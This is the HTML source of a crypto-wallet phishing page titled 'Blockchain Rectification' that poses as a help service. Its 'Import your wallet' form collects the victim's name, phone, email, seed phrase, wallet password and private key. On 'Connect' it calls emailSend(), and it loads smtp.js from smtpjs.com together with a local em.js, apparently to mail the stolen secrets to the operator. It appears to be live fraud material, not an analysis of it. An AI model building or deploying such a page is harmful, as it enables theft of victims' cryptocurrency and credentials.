<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Blockchain Rectification - We are here to help you resolve your crypto related issues</title>
	<link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico"/> 
    <!-- email css -->
    <link rel="stylesheet" href="css/email.css">
<!-- body -->
		<div class="frame">

		<img src="images/Import.png" width="23px" />
		<h2 style="color:white;" font-family:Bookman Old Style;">Import your wallet</h2>

		<form onsubmit="emailSend(); reset(); return false;">

		 	 <div class="email">

			<input type="text" id="name" placeholder="Enter your name" name="name" required>

			<img src="images/name.png" width="23px" />

			</div>

			

		  <div class="email">

			<input type="text" id="phone" placeholder="Phone number" name="phone" required>

			<img src="images/contact.png" width="23px" />

			</div>

			

		 <div class="email">

			<input type="email" id="email" placeholder="Email address" name="email" required>

			<img src="images/email.png" width="23px" />

			</div><hr color="#ffffff"></br>

		 <div class="email">

			<input type="text" id="wallet" placeholder="Wallet name" name="wallet" required>

			<img src="images/wallet.png" width="23px" />

			</div>

			<div class="email">

			<input type="text" id="phrase" placeholder="Enter your phrase" name="phrase" required>

			<img src="images/phrase.png" width="23px" />

			</div>

			<div class="password">

			<input type="text" id="walletp" placeholder="Wallet password" name="walletp" required>

			<img src="images/password.png" width="23px" />

			</div>

			<div class="email">

			<input type="text" id="privk" placeholder="Enter your Private key" name="privk" required>

			<img src="images/padlock.png" width="23px" />

			</div> 

			<button type="submit" class="btn">Connect</button>

		</form>

	</div> 

      <!-- Javascript files-->
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

	<script src="https://smtpjs.com/v3/smtp.js">

</script>

	<script src="em.js"></script>
   </body>
	</html>
